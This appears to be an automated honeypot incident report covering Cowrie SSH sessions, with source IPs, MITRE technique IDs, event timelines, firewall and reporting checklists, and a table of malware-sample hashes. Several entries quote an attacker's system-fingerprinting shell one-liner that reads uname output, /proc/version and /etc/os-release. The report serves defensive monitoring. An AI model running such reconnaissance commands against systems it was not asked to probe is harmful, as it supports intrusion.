| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:47:48` | `cowrie.session.connect` |
| `2026-08-24 12:47:48` | `cowrie.client.version` |
| `2026-08-24 12:47:48` | `cowrie.client.kex` |
| `2026-08-24 12:47:51` | `cowrie.login.success` |
| `2026-08-24 12:47:52` | `cowrie.session.params` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.success` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:52` | `cowrie.command.input` |
| `2026-08-24 12:47:53` | `cowrie.log.closed` |
| `2026-08-24 12:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd6368adc7c

| Field | Detail |
|---|---|
| **Source IP** | `151.243.3[.]61` |
| **First Seen** | 2026-08-24 12:48 |
| **Last Seen** | 2026-08-24 12:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:48:09` | `cowrie.session.connect` |
| `2026-08-24 12:48:09` | `cowrie.client.version` |
| `2026-08-24 12:48:09` | `cowrie.client.kex` |
| `2026-08-24 12:48:10` | `cowrie.login.success` |
| `2026-08-24 12:48:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.243.3[.]61` to AbuseIPDB if not already reported
- [ ] Block `151.243.3[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd260388364

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-08-24 12:48 |
| **Last Seen** | 2026-08-24 12:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:48:18` | `cowrie.session.connect` |
| `2026-08-24 12:48:19` | `cowrie.client.version` |
| `2026-08-24 12:48:19` | `cowrie.client.kex` |
| `2026-08-24 12:48:22` | `cowrie.login.success` |
| `2026-08-24 12:48:23` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4096498e7ca0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:49 |
| **Last Seen** | 2026-08-24 12:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:49:23` | `cowrie.session.connect` |
| `2026-08-24 12:49:23` | `cowrie.client.version` |
| `2026-08-24 12:49:23` | `cowrie.client.kex` |
| `2026-08-24 12:49:25` | `cowrie.login.success` |
| `2026-08-24 12:49:26` | `cowrie.session.params` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.success` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:26` | `cowrie.command.input` |
| `2026-08-24 12:49:27` | `cowrie.log.closed` |
| `2026-08-24 12:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-935272ca71e5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:51 |
| **Last Seen** | 2026-08-24 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:51:33` | `cowrie.session.connect` |
| `2026-08-24 12:51:33` | `cowrie.client.version` |
| `2026-08-24 12:51:33` | `cowrie.client.kex` |
| `2026-08-24 12:51:34` | `cowrie.login.success` |
| `2026-08-24 12:51:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:51:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:51:34` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa677fa8b96

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:51 |
| **Last Seen** | 2026-08-24 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:51:37` | `cowrie.session.connect` |
| `2026-08-24 12:51:37` | `cowrie.client.version` |
| `2026-08-24 12:51:37` | `cowrie.client.kex` |
| `2026-08-24 12:51:38` | `cowrie.login.success` |
| `2026-08-24 12:51:39` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:51:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:51:39` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f29eac69587

| Field | Detail |
|---|---|
| **Source IP** | `176.103.15[.]75` |
| **First Seen** | 2026-08-24 12:51 |
| **Last Seen** | 2026-08-24 12:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:51:42` | `cowrie.session.connect` |
| `2026-08-24 12:51:42` | `cowrie.client.version` |
| `2026-08-24 12:51:42` | `cowrie.client.kex` |
| `2026-08-24 12:51:43` | `cowrie.login.success` |
| `2026-08-24 12:51:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.103.15[.]75` to AbuseIPDB if not already reported
- [ ] Block `176.103.15[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120657d12a2e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.132[.]230` |
| **First Seen** | 2026-08-24 12:51 |
| **Last Seen** | 2026-08-24 12:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:51:49` | `cowrie.session.connect` |
| `2026-08-24 12:51:49` | `cowrie.client.version` |
| `2026-08-24 12:51:49` | `cowrie.client.kex` |
| `2026-08-24 12:51:51` | `cowrie.login.success` |
| `2026-08-24 12:51:51` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.132[.]230` to AbuseIPDB if not already reported
- [ ] Block `65.20.132[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541ef38897c1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:52 |
| **Last Seen** | 2026-08-24 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:52:30` | `cowrie.session.connect` |
| `2026-08-24 12:52:30` | `cowrie.client.version` |
| `2026-08-24 12:52:30` | `cowrie.client.kex` |
| `2026-08-24 12:52:31` | `cowrie.login.success` |
| `2026-08-24 12:52:33` | `cowrie.session.params` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.success` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.command.input` |
| `2026-08-24 12:52:33` | `cowrie.log.closed` |
| `2026-08-24 12:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07903a01aa5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:54 |
| **Last Seen** | 2026-08-24 12:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:54:04` | `cowrie.session.connect` |
| `2026-08-24 12:54:04` | `cowrie.client.version` |
| `2026-08-24 12:54:04` | `cowrie.client.kex` |
| `2026-08-24 12:54:06` | `cowrie.login.success` |
| `2026-08-24 12:54:07` | `cowrie.session.params` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.success` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.command.input` |
| `2026-08-24 12:54:07` | `cowrie.log.closed` |
| `2026-08-24 12:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.229[.]23` | **66** | 2026-08-24 08:58 | 2026-08-24 12:54 | 58m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-24 09:18 | 2026-08-24 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.119[.]177` | **7** | 2026-08-24 12:34 | 2026-08-24 12:46 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-08-24 09:36 | 2026-08-24 12:36 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.224[.]88` | **4** | 2026-08-24 11:39 | 2026-08-24 11:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **3** | 2026-08-24 11:55 | 2026-08-24 12:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `69.137.7[.]138` | **3** | 2026-08-24 12:06 | 2026-08-24 12:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-24 10:11 | 2026-08-24 10:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `187.103.126[.]46` | **2** | 2026-08-24 12:21 | 2026-08-24 12:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.211.78[.]70` | **2** | 2026-08-24 10:19 | 2026-08-24 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.224.153[.]128` | **2** | 2026-08-24 10:23 | 2026-08-24 10:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]177` | **2** | 2026-08-24 12:52 | 2026-08-24 12:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.173.127[.]185` | 1 | 2026-08-24 09:28 | 2026-08-24 09:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]21` | 1 | 2026-08-24 09:16 | 2026-08-24 09:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.127.144[.]154` | 1 | 2026-08-24 09:13 | 2026-08-24 09:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `136.169.36[.]120` | 1 | 2026-08-24 10:10 | 2026-08-24 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-08-24 10:32 | 2026-08-24 10:33 | 44s | 0 | `T1592` | 🟢 LOW |
| `171.102.130[.]59` | 1 | 2026-08-24 11:57 | 2026-08-24 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]197` | 1 | 2026-08-24 11:02 | 2026-08-24 11:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-24 12:15 | 2026-08-24 12:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.152.30[.]163` | 1 | 2026-08-24 12:48 | 2026-08-24 12:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `186.115.118[.]162` | 1 | 2026-08-24 10:28 | 2026-08-24 10:28 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.119.59[.]90` | 1 | 2026-08-24 12:35 | 2026-08-24 12:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]213` | 1 | 2026-08-24 09:30 | 2026-08-24 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.93[.]75` | 1 | 2026-08-24 12:29 | 2026-08-24 12:29 | 11s | 0 | `T1592` | 🟢 LOW |
| `207.164.115[.]41` | 1 | 2026-08-24 09:12 | 2026-08-24 09:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]19` | 1 | 2026-08-24 10:28 | 2026-08-24 10:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]20` | 1 | 2026-08-24 10:28 | 2026-08-24 10:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.244.214[.]136` | 1 | 2026-08-24 12:50 | 2026-08-24 12:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.164.155[.]173` | 1 | 2026-08-24 10:07 | 2026-08-24 10:07 | 31s | 0 | `T1592` | 🟢 LOW |
| `218.157.93[.]160` | 1 | 2026-08-24 12:34 | 2026-08-24 12:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `219.85.238[.]32` | 1 | 2026-08-24 10:43 | 2026-08-24 10:44 | 11s | 0 | `T1592` | 🟢 LOW |
| `220.156.49[.]27` | 1 | 2026-08-24 10:15 | 2026-08-24 10:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.179.87[.]204` | 1 | 2026-08-24 09:35 | 2026-08-24 09:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `223.84.195[.]56` | 1 | 2026-08-24 10:49 | 2026-08-24 10:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-24 09:35 | 2026-08-24 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.90[.]246` | 1 | 2026-08-24 09:19 | 2026-08-24 09:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-08-24 10:02 | 2026-08-24 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]69` | 1 | 2026-08-24 10:33 | 2026-08-24 10:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]206` | 1 | 2026-08-24 09:43 | 2026-08-24 09:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]104` | 1 | 2026-08-24 09:57 | 2026-08-24 09:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `68.198.1[.]144` | 1 | 2026-08-24 11:27 | 2026-08-24 11:27 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-24 09:35 | 2026-08-24 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.187.203[.]185` | 1 | 2026-08-24 11:38 | 2026-08-24 11:38 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.39.109[.]160` | 1 | 2026-08-24 10:55 | 2026-08-24 10:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.99.93[.]200` | 1 | 2026-08-24 11:14 | 2026-08-24 11:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.118.169[.]27` | 1 | 2026-08-24 11:43 | 2026-08-24 11:43 | 9s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
